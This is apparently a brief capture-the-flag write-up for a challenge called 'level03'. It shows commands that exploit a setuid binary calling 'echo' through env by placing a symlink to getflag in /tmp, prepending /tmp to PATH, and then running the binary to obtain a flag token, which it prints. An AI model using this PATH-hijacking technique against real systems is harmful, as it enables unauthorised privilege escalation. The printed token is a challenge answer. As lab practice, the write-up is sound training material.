# level03

- `$ strings level03`
    > [...]
    > /usr/bin/env echo Exploit me
    > [...]

- `$ which getflag`
    > /bin/getflag

- `$ ln -s /bin/getflag /tmp/echo`

- `$ PATH=/tmp:$PATH ./level03`
    > Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

